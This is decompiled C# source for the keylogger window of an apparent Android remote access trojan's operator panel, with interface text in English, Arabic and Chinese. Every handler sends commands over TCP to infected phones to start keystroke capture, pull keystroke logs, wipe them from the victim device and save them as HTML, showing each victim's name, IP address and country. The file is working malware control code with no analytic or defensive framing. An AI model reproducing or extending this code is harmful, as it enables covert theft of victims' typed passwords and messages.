using System;
using System.Collections.Generic;
using System.ComponentModel;
using System.Diagnostics;
using System.Drawing;
using System.IO;
using System.Net.Sockets;
using System.Runtime.CompilerServices;
using System.Threading;
using System.Windows.Forms;
using DrakeUI.Framework;
using Microsoft.VisualBasic;
using Microsoft.VisualBasic.CompilerServices;

// Token: 0x0200008A RID: 138
[DesignerGenerated]
public partial class Keylogger : Form
{
	// Token: 0x0600063F RID: 1599 RVA: 0x000A175C File Offset: 0x0009F95C
	public void CraxsStyle()
	{
		string language = RegistryHandler.Get_Language();
		if (Operators.CompareString(language, "AR", false) != 0)
		{
			if (Operators.CompareString(language, "CN", false) == 0)
			{
				this.getbtn.Text = "得到";
				this.delbtn.Text = "删除";
				this.savedbtn.Text = "已下载";
				this.backallbtn.Text = "全部下载";
				this.deleteallbtn.Text = "删除所有";
				this.keytabs.TabPages[0].Text = "在线的";
				this.keytabs.TabPages[1].Text = "离线";
			}
		}
		else
		{
			this.getbtn.Text = "تحميل السجل";
			this.delbtn.Text = "حذف السجل";
			this.savedbtn.Text = "تم تنزيله";
			this.backallbtn.Text = "تحميل الكل";
			this.deleteallbtn.Text = "حذف الكل";
			this.keytabs.TabPages[0].Text = "مباشر";
			this.keytabs.TabPages[1].Text = "مسجل";
		}
	}

	// Token: 0x06000640 RID: 1600 RVA: 0x000A18A8 File Offset: 0x0009FAA8
	public Keylogger()
	{
		base.Load += this.Keylogger_Load;
		base.Closing += this.Keylogger_Closing;
		this.combologs = new DrakeUIComboBox();
		this.Title = "null";
		this.IsActive = false;
		this.searchbefore = new List<DataGridViewRow>();
		this.lastFoundIndex = -1;
		this.InitializeComponent();
		this.Font = reso.f;
		this.CraxsStyle();
	}

	// Token: 0x06000641 RID: 1601 RVA: 0x0000206C File Offset: 0x0000026C
	private void SpyStyle()
	{
	}

	// Token: 0x06000642 RID: 1602 RVA: 0x000A1928 File Offset: 0x0009FB28
	private void TOpacity_Tick(object sender, EventArgs e)
	{
		if (base.Opacity != 1.0)
		{
			base.Opacity += 0.1;
		}
		else
		{
			this.TOpacity.Enabled = false;
		}
	}

	// Token: 0x06000643 RID: 1603 RVA: 0x000A1970 File Offset: 0x0009FB70
	private void Keylogger_Load(object sender, EventArgs e)
	{
		this.DGV0.ColumnHeadersDefaultCellStyle.Font = reso.f;
		this.DGV0.DefaultCellStyle.Font = reso.f;
		this.DGV0.ContextMenuStrip = this.ctxMenu;
		base.Icon = new Icon(reso.res_Path + "\\Icons\\win\\19.ico");
		try
		{
			this.ClientPic.Image = this.classClient.Wallpaper;
			this.clinameinfo.Text = string.Concat(new string[]
			{
				"Name: ",
				this.classClient.ClientName,
				Strings.Space(2),
				"IP: ",
				this.classClient.ClientAddressIP,
				Strings.Space(2),
				"Country: ",
				this.classClient.Country
			});
		}
		catch (Exception)
		{
		}
		this.Text = this.Title;
		this.SaveToolStripMenuItem.Visible = true;
		this.SaveAsToolStripMenuItem.Visible = true;
		this.TOpacity.Interval = SpySettings.T_Interval;
		this.TOpacity.Enabled = true;
		if (this.classClient != null)
		{
			TcpClient myClient = this.classClient.myClient;
			object[] parametersObjects = new object[]
			{
				myClient,
				string.Concat(new string[]
				{
					SecurityKey.KeysClient8,
					Data.SPL_SOCKET,
					SecurityKey.Keylogger,
					Data.SPL_SOCKET,
					Data.SPL_ARRAY,
					Data.SPL_SOCKET,
					"(unknown)"
				}),
				Codes.Encoding().GetBytes("null"),
				this.classClient
			};
			this.classClient.SendMessage(parametersObjects);
		}
	}

	// Token: 0x06000644 RID: 1604 RVA: 0x000A1B3C File Offset: 0x0009FD3C
	private void getbtn_click(object sender, EventArgs e)
	{
		if (!this.IsActive)
		{
			EagleAlert.Showinformation("Accessibilty Not Enabled.");
		}
		else if (this.combologs.Text.Length < 1 | this.combologs.Text == null)
		{
			Interaction.MsgBox("No  Logs Found...", MsgBoxStyle.OkOnly, null);
		}
		else if (this.classClient != null)
		{
			try
			{
				string[] array = this.classClient.Keys.Split(new char[]
				{
					':'
				});
				object[] parametersObjects = new object[]
				{
					this.Client,
					string.Concat(new string[]
					{
						SecurityKey.KeysClient2,
						Data.SPL_SOCKET,
						"rd<*>",
						this.combologs.Text,
						Data.SPL_SOCKET,
						array[0],
						Data.SPL_SOCKET,
						array[1],
						Data.SPL_SOCKET,
						SecurityKey.Lockscreen,
						Data.SPL_SOCKET,
						Conversions.ToString(0),
						Data.SPL_SOCKET,
						Conversions.ToString(0),
						Data.SPL_SOCKET,
						Data.SPL_ARRAY,
						Data.SPL_SOCKET,
						this.classClient.ClientRemoteAddress
					}),
					Codes.Encoding().GetBytes("null"),
					this.classClient
				};
				this.classClient.SendMessage(parametersObjects);
				this.loadinglogs.Enabled = true;
				this.loadinglogs.Visible = true;
			}
			catch (Exception)
			{
			}
		}
	}

	// Token: 0x06000645 RID: 1605 RVA: 0x000A1CE8 File Offset: 0x0009FEE8
	private void Button2_Click(object sender, EventArgs e)
	{
		if (!this.IsActive)
		{
			Interaction.MsgBox("Accessibilty Not Enabled.", MsgBoxStyle.OkOnly, null);
		}
		else if (this.combologs.Text.Length < 1 | this.combologs.Text == null)
		{
			Interaction.MsgBox("No  Logs Found...", MsgBoxStyle.OkOnly, null);
		}
		else if (MessageBox.Show("Log will deleted completely ,\r\nAccept ?", "Keylogger", MessageBoxButtons.YesNo) == DialogResult.Yes && this.classClient != null)
		{
			try
			{
				string[] array = this.classClient.Keys.Split(new char[]
				{
					':'
				});
				object[] parametersObjects = new object[]
				{
					this.Client,
					Operators.ConcatenateObject(Operators.ConcatenateObject(Operators.ConcatenateObject(Operators.ConcatenateObject(Operators.ConcatenateObject(Operators.ConcatenateObject(Operators.ConcatenateObject(Operators.ConcatenateObject(Operators.ConcatenateObject(Operators.ConcatenateObject(Operators.ConcatenateObject(Operators.ConcatenateObject(Operators.ConcatenateObject(Operators.ConcatenateObject(Operators.ConcatenateObject(SecurityKey.KeysClient2 + Data.SPL_SOCKET + "rdd<*>", Codes.BSEN(this.combologs.Text)), Data.SPL_SOCKET), array[0]), Data.SPL_SOCKET), array[1]), Data.SPL_SOCKET), SecurityKey.Lockscreen), Data.SPL_SOCKET), Conversions.ToString(0)), Data.SPL_SOCKET), Conversions.ToString(0)), Data.SPL_SOCKET), Data.SPL_ARRAY), Data.SPL_SOCKET), this.classClient.ClientRemoteAddress),
					Codes.Encoding().GetBytes("null"),
					this.classClient
				};
				this.classClient.SendMessage(parametersObjects);
				this.combologs.Text = "";
			}
			catch (Exception)
			{
			}
		}
	}

	// Token: 0x06000646 RID: 1606 RVA: 0x000A1EB0 File Offset: 0x000A00B0
	public void Done(object[] objs)
	{
		if (this.offlinetext.InvokeRequired)
		{
			Keylogger.OffLOG method = new Keylogger.OffLOG(this.Done);
			this.offlinetext.Invoke(method, new object[]
			{
				objs
			});
		}
		else
		{
			this.offlinetext.AppendText(Conversions.ToString(objs[0]));
			this.offlinetext.SelectionStart = Strings.Len(this.offlinetext.Text);
			this.offlinetext.ScrollToCaret();
			this.offlinetext.Select();
		}
	}

	// Token: 0x06000647 RID: 1607 RVA: 0x000A1F34 File Offset: 0x000A0134
	public void cleait()
	{
		if (this.offlinetext.InvokeRequired)
		{
			Keylogger.clearold method = new Keylogger.clearold(this.cleait);
			this.offlinetext.Invoke(method, new object[0]);
		}
		else
		{
			this.loadinglogs.Enabled = false;
			this.loadinglogs.Visible = false;
			this.offlinetext.Clear();
		}
	}

	// Token: 0x06000648 RID: 1608 RVA: 0x000A1F94 File Offset: 0x000A0194
	private void Button3_Click(object sender, EventArgs e)
	{
		try
		{
			if (!Directory.Exists(this.classClient.FolderUSER + "\\OFFLINE_KEYLOGS"))
			{
				Directory.CreateDirectory(this.classClient.FolderUSER + "\\OFFLINE_KEYLOGS");
			}
			Process.Start(this.classClient.FolderUSER + "\\OFFLINE_KEYLOGS");
		}
		catch (Exception)
		{
		}
	}

	// Token: 0x06000649 RID: 1609 RVA: 0x000A200C File Offset: 0x000A020C
	private void Delbtn_Click(object sender, EventArgs e)
	{
		if (!this.IsActive)
		{
			Interaction.MsgBox("Accessibilty Not Enabled.", MsgBoxStyle.OkOnly, null);
		}
		else if (this.combologs.Text.Length < 1 | this.combologs.Text == null)
		{
			Interaction.MsgBox("No  Logs Found...", MsgBoxStyle.OkOnly, null);
		}
		else if (this.classClient != null)
		{
			try
			{
				try
				{
					string text = "this record will be removed completely from the phone , continue ?";
					string language = RegistryHandler.Get_Language();
					if (Operators.CompareString(language, "AR", false) != 0)
					{
						if (Operators.CompareString(language, "CN", false) == 0)
						{
							text = "这条记录将从手机中彻底删除，继续吗？";
						}
					}
					else
					{
						text = "سيتم حذف هذا السجل بالكامل من الهاتف ، هل تريد المتابعة؟";
					}
					if (MessageBox.Show(text, "Keylogger", MessageBoxButtons.YesNo) != DialogResult.Yes)
					{
						return;
					}
				}
				catch (Exception)
				{
				}
				string[] array = this.classClient.Keys.Split(new char[]
				{
					':'
				});
				object[] parametersObjects = new object[]
				{
					this.Client,
					string.Concat(new string[]
					{
						SecurityKey.KeysClient2,
						Data.SPL_SOCKET,
						"rdd<*>",
						this.combologs.Text,
						Data.SPL_SOCKET,
						array[0],
						Data.SPL_SOCKET,
						array[1],
						Data.SPL_SOCKET,
						SecurityKey.Lockscreen,
						Data.SPL_SOCKET,
						Conversions.ToString(0),
						Data.SPL_SOCKET,
						Conversions.ToString(0),
						Data.SPL_SOCKET,
						Data.SPL_ARRAY,
						Data.SPL_SOCKET,
						this.classClient.ClientRemoteAddress
					}),
					Codes.Encoding().GetBytes("null"),
					this.classClient
				};
				this.classClient.SendMessage(parametersObjects);
				this.combologs.Items.Remove(this.combologs.Text);
				this.combologs.Text = "";
			}
			catch (Exception)
			{
			}
		}
	}

	// Token: 0x0600064A RID: 1610 RVA: 0x000A2248 File Offset: 0x000A0448
	private void Button3_Click_1(object sender, EventArgs e)
	{
		if (this.classClient != null)
		{
			try
			{
				try
				{
					string text = "All record will be removed completely from the phone , continue ?";
					string language = RegistryHandler.Get_Language();
					if (Operators.CompareString(language, "AR", false) != 0)
					{
						if (Operators.CompareString(language, "CN", false) == 0)
						{
							text = "所有记录将从手机中完全删除，继续吗？";
						}
					}
					else
					{
						text = "سيتم حذف جميع السجل بالكامل من الهاتف ، هل تريد المتابعة؟";
					}
					if (MessageBox.Show(text, "Keylogger", MessageBoxButtons.YesNo) != DialogResult.Yes)
					{
						return;
					}
				}
				catch (Exception)
				{
				}
				string[] array = this.classClient.Keys.Split(new char[]
				{
					':'
				});
				object[] parametersObjects = new object[]
				{
					this.Client,
					string.Concat(new string[]
					{
						SecurityKey.KeysClient2,
						Data.SPL_SOCKET,
						"rdall<*>r",
						Data.SPL_SOCKET,
						array[0],
						Data.SPL_SOCKET,
						array[1],
						Data.SPL_SOCKET,
						SecurityKey.Lockscreen,
						Data.SPL_SOCKET,
						Conversions.ToString(0),
						Data.SPL_SOCKET,
						Conversions.ToString(0),
						Data.SPL_SOCKET,
						Data.SPL_ARRAY,
						Data.SPL_SOCKET,
						this.classClient.ClientRemoteAddress
					}),
					Codes.Encoding().GetBytes("null"),
					this.classClient
				};
				this.classClient.SendMessage(parametersObjects);
				this.combologs.Items.Clear();
				this.combologs.Text = "";
			}
			catch (Exception)
			{
			}
		}
	}

	// Token: 0x0600064B RID: 1611 RVA: 0x000A2414 File Offset: 0x000A0614
	private void Backallbtn_Click(object sender, EventArgs e)
	{
		if (this.combologs.Items.Count < 1)
		{
			Interaction.MsgBox("No  Logs Found...", MsgBoxStyle.OkOnly, null);
		}
		else if (this.classClient != null)
		{
			try
			{
				string[] array = this.classClient.Keys.Split(new char[]
				{
					':'
				});
				object[] parametersObjects = new object[]
				{
					this.Client,
					string.Concat(new string[]
					{
						SecurityKey.KeysClient2,
						Data.SPL_SOCKET,
						"rdall<*>g",
						Data.SPL_SOCKET,
						array[0],
						Data.SPL_SOCKET,
						array[1],
						Data.SPL_SOCKET,
						SecurityKey.Lockscreen,
						Data.SPL_SOCKET,
						Conversions.ToString(0),
						Data.SPL_SOCKET,
						Conversions.ToString(0),
						Data.SPL_SOCKET,
						Data.SPL_ARRAY,
						Data.SPL_SOCKET,
						this.classClient.ClientRemoteAddress
					}),
					Codes.Encoding().GetBytes("null"),
					this.classClient
				};
				this.classClient.SendMessage(parametersObjects);
			}
			catch (Exception)
			{
			}
		}
	}

	// Token: 0x0600064C RID: 1612 RVA: 0x000A2564 File Offset: 0x000A0764
	private void Searchbtn_Click(object sender, EventArgs e)
	{
		if (string.IsNullOrEmpty(this.offlinetext.Text))
		{
			EagleAlert.Showinformation("No Data Found");
		}
		else if (string.IsNullOrEmpty(this.searchtext.Text))
		{
			EagleAlert.Showinformation("Enter Text to search First");
		}
		else
		{
			bool flag = true;
			string text = this.searchtext.Text;
			string text2 = this.offlinetext.Text;
			int num = text2.IndexOf(text, StringComparison.CurrentCultureIgnoreCase);
			if (num >= 0 && this.lastFoundIndex == num && this.lastFoundIndex < num)
			{
				this.lastFoundIndex = num;
				this.offlinetext.Select(num, text.Length);
				this.offlinetext.SelectionColor = Color.White;
				this.offlinetext.ScrollToCaret();
				flag = false;
			}
			if (flag)
			{
				EagleAlert.Showinformation("No Result Found");
			}
		}
	}

	// Token: 0x0600064D RID: 1613 RVA: 0x000031BE File Offset: 0x000013BE
	private void Clearsrchbtn_Click(object sender, EventArgs e)
	{
		this.searchtext.Text = "";
		this.offlinetext.SelectAll();
		this.offlinetext.SelectionColor = Color.Black;
		this.offlinetext.SelectionStart = 0;
		this.lastFoundIndex = -1;
	}

	// Token: 0x0600064E RID: 1614 RVA: 0x000A2634 File Offset: 0x000A0834
	private void Searchtext_TextChanged(object sender, EventArgs e)
	{
		this.searchbefore.Clear();
		if (!string.IsNullOrEmpty(this.searchtext.Text))
		{
			this.clearsrchbtn.Visible = true;
		}
		else
		{
			this.clearsrchbtn.Visible = false;
		}
	}

	// Token: 0x0600064F RID: 1615 RVA: 0x000A267C File Offset: 0x000A087C
	private void DrakeUIButtonIcon1_Click(object sender, EventArgs e)
	{
		if (this.classClient != null)
		{
			TcpClient myClient = this.classClient.myClient;
			object[] parametersObjects = new object[]
			{
				myClient,
				string.Concat(new string[]
				{
					SecurityKey.KeysClient8,
					Data.SPL_SOCKET,
					SecurityKey.Keylogger,
					Data.SPL_SOCKET,
					Data.SPL_ARRAY,
					Data.SPL_SOCKET,
					"(unknown)"
				}),
				Codes.Encoding().GetBytes("null"),
				this.classClient
			};
			this.classClient.SendMessage(parametersObjects);
		}
	}

	// Token: 0x06000650 RID: 1616 RVA: 0x000A271C File Offset: 0x000A091C
	private void Exitbtn_Click(object sender, EventArgs e)
	{
		if (this.classClient != null)
		{
			this.classClient.Keylogg = false;
			object[] parametersObjects = new object[]
			{
				this.Client,
				SecurityKey.KeysClient9 + Data.SPL_SOCKET + SecurityKey.Keylogger,
				Codes.Encoding().GetBytes("null"),
				this.classClient
			};
			this.classClient.SendMessage(parametersObjects);
		}
	}

	// Token: 0x06000651 RID: 1617 RVA: 0x000A271C File Offset: 0x000A091C
	private void Keylogger_Closing(object sender, CancelEventArgs e)
	{
		if (this.classClient != null)
		{
			this.classClient.Keylogg = false;
			object[] parametersObjects = new object[]
			{
				this.Client,
				SecurityKey.KeysClient9 + Data.SPL_SOCKET + SecurityKey.Keylogger,
				Codes.Encoding().GetBytes("null"),
				this.classClient
			};
			this.classClient.SendMessage(parametersObjects);
		}
	}

	// Token: 0x06000652 RID: 1618 RVA: 0x000A2790 File Offset: 0x000A0990
	private void SaveToolStripMenuItem_Click(object sender, EventArgs e)
	{
		reso.Directory_Exist(this.classClient);
		ThreadPool.QueueUserWorkItem(delegate(object a0)
		{
			reso.SAVEit((Array)a0);
		}, new object[]
		{
			this.DGV0,
			this.tmpFolderUSER,
			"Keylogger",
			this.tmpClientName,
			this.tmpCountry + " - " + this.tmpAddressIP,
			"Keylogger",
			"log",
			DateAndTime.Now.ToString("yyyy-dd-M--HH-mm-ss") + ".html"
		});
	}

	// Token: 0x06000653 RID: 1619 RVA: 0x000A2840 File Offset: 0x000A0A40
	private void SaveAsToolStripMenuItem_Click(object sender, EventArgs e)
	{
		SaveFileDialog saveFileDialog = new SaveFileDialog();
		saveFileDialog.FileName = DateAndTime.Now.ToString("yyyy-dd-M--HH-mm-ss") + ".html";
		saveFileDialog.Filter = "html (*.html)|*.html";
		if (saveFileDialog.ShowDialog() == DialogResult.OK)
		{
			ThreadPool.QueueUserWorkItem(delegate(object a0)
			{
				reso.SAVEit((Array)a0);
			}, new object[]
			{
				this.DGV0,
				"null",
				saveFileDialog.FileName,
				this.tmpClientName,
				this.tmpCountry + " - " + this.tmpAddressIP,
				"Keylogger",
				"log",
				"null"
			});
		}
		saveFileDialog.Dispose();
	}

	// Token: 0x06000654 RID: 1620 RVA: 0x000A2914 File Offset: 0x000A0B14
	private void button1_Click(object sender, EventArgs e)
	{
		if (!this.IsActive)
		{
			Interaction.MsgBox("Accessibilty Not Enabled.", MsgBoxStyle.OkOnly, null);
		}
		else if (this.combologs.Text.Length < 1 | this.combologs.Text == null)
		{
			Interaction.MsgBox("No  Logs Found...", MsgBoxStyle.OkOnly, null);
		}
		else if (this.classClient != null)
		{
			try
			{
				string[] array = this.classClient.Keys.Split(new char[]
				{
					':'
				});
				object[] parametersObjects = new object[]
				{
					this.Client,
					string.Concat(new string[]
					{
						SecurityKey.KeysClient2,
						Data.SPL_SOCKET,
						"rd<*>",
						this.combologs.Text,
						Data.SPL_SOCKET,
						array[0],
						Data.SPL_SOCKET,
						array[1],
						Data.SPL_SOCKET,
						SecurityKey.Lockscreen,
						Data.SPL_SOCKET,
						Conversions.ToString(0),
						Data.SPL_SOCKET,
						Conversions.ToString(0),
						Data.SPL_SOCKET,
						Data.SPL_ARRAY,
						Data.SPL_SOCKET,
						this.classClient.ClientRemoteAddress
					}),
					Codes.Encoding().GetBytes("null"),
					this.classClient
				};
				this.classClient.SendMessage(parametersObjects);
				this.loadinglogs.Enabled = true;
				this.loadinglogs.Visible = true;
			}
			catch (Exception)
			{
			}
		}
	}

	// Token: 0x0400090D RID: 2317
	[CompilerGenerated]
	[DebuggerBrowsable(DebuggerBrowsableState.Never)]
	[AccessedThroughProperty("TOpacity")]
	private System.Windows.Forms.Timer _TOpacity;

	// Token: 0x0400090E RID: 2318
	[CompilerGenerated]
	[DebuggerBrowsable(DebuggerBrowsableState.Never)]
	[AccessedThroughProperty("SaveToolStripMenuItem")]
	private ToolStripMenuItem _SaveToolStripMenuItem;

	// Token: 0x0400090F RID: 2319
	[CompilerGenerated]
	[DebuggerBrowsable(DebuggerBrowsableState.Never)]
	[AccessedThroughProperty("SaveAsToolStripMenuItem")]
	private ToolStripMenuItem _SaveAsToolStripMenuItem;

	// Token: 0x04000910 RID: 2320
	[CompilerGenerated]
	[DebuggerBrowsable(DebuggerBrowsableState.Never)]
	[AccessedThroughProperty("getbtn")]
	private Button _getbtn;

	// Token: 0x04000911 RID: 2321
	[CompilerGenerated]
	[DebuggerBrowsable(DebuggerBrowsableState.Never)]
	[AccessedThroughProperty("Button2")]
	private Button _Button2;

	// Token: 0x04000912 RID: 2322
	[CompilerGenerated]
	[DebuggerBrowsable(DebuggerBrowsableState.Never)]
	[AccessedThroughProperty("savedbtn")]
	private Button _savedbtn;

	// Token: 0x04000913 RID: 2323
	[CompilerGenerated]
	[DebuggerBrowsable(DebuggerBrowsableState.Never)]
	[AccessedThroughProperty("delbtn")]
	private Button _delbtn;

	// Token: 0x04000914 RID: 2324
	[CompilerGenerated]
	[DebuggerBrowsable(DebuggerBrowsableState.Never)]
	[AccessedThroughProperty("deleteallbtn")]
	private Button _deleteallbtn;

	// Token: 0x04000915 RID: 2325
	[CompilerGenerated]
	[DebuggerBrowsable(DebuggerBrowsableState.Never)]
	[AccessedThroughProperty("backallbtn")]
	private Button _backallbtn;

	// Token: 0x04000916 RID: 2326
	[CompilerGenerated]
	[DebuggerBrowsable(DebuggerBrowsableState.Never)]
	[AccessedThroughProperty("clearsrchbtn")]
	private DrakeUIAvatar _clearsrchbtn;

	// Token: 0x04000917 RID: 2327
	[CompilerGenerated]
	[DebuggerBrowsable(DebuggerBrowsableState.Never)]
	[AccessedThroughProperty("searchtext")]
	private DrakeUITextBox _searchtext;

	// Token: 0x04000918 RID: 2328
	[CompilerGenerated]
	[DebuggerBrowsable(DebuggerBrowsableState.Never)]
	[AccessedThroughProperty("searchbtn")]
	private DrakeUIAvatar _searchbtn;

	// Token: 0x04000919 RID: 2329
	[CompilerGenerated]
	[DebuggerBrowsable(DebuggerBrowsableState.Never)]
	[AccessedThroughProperty("exitbtn")]
	private DrakeUIButtonIcon _exitbtn;

	// Token: 0x0400091A RID: 2330
	[CompilerGenerated]
	[DebuggerBrowsable(DebuggerBrowsableState.Never)]
	[AccessedThroughProperty("DrakeUIButtonIcon1")]
	private DrakeUIButtonIcon _DrakeUIButtonIcon1;

	// Token: 0x0400091B RID: 2331
	public TcpClient Client;

	// Token: 0x0400091C RID: 2332
	public Client classClient;

	// Token: 0x0400091D RID: 2333
	public string Title;

	// Token: 0x0400091E RID: 2334
	public bool IsActive;

	// Token: 0x0400091F RID: 2335
	public string tmpFolderUSER;

	// Token: 0x04000920 RID: 2336
	public string tmpClientName;

	// Token: 0x04000921 RID: 2337
	public string tmpCountry;

	// Token: 0x04000922 RID: 2338
	public string tmpAddressIP;

	// Token: 0x04000923 RID: 2339
	private List<DataGridViewRow> searchbefore;

	// Token: 0x04000924 RID: 2340
	private int lastFoundIndex;

	// Token: 0x0200008B RID: 139
	// (Invoke) Token: 0x06000656 RID: 1622
	public delegate void OffLOG(object[] objs);

	// Token: 0x0200008C RID: 140
	// (Invoke) Token: 0x0600065A RID: 1626
	public delegate void clearold();
}
